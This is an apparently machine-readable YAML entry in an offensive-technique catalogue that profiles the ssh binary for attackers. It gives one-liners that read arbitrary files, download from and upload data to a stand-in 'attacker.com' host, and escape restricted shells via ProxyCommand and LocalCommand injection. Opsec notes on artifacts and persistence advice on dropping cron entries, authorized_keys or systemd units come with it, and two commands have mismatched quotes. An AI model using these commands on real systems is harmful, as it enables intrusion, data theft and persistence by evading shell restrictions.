---
name: ssh
capabilities:
- exec
- spawn
- read
- upload
- download
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  - Outbound network traffic to attacker host
  notes: ''
persistence_potential: true
examples:
- id: download
  description: Fetch a remote file to disk.
  capabilities:
  - download
  command: ssh user@attacker.com 'cat /path/to/input-file"
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: ssh -F /path/to/input-file x
  notes: The read file content is corrupted by error prints.
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: ssh localhost /bin/sh
  notes: Reconnecting may help bypassing restricted shells.
- id: shell-2
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
- id: shell-3
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
  notes: Spawn the shell on the client, but still requires a successful remote connection.
- id: upload
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: echo DATA | ssh user@attacker.com 'cat >/path/to/output-file"
references:
- https://gtfobins.github.io/gtfobins/ssh/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
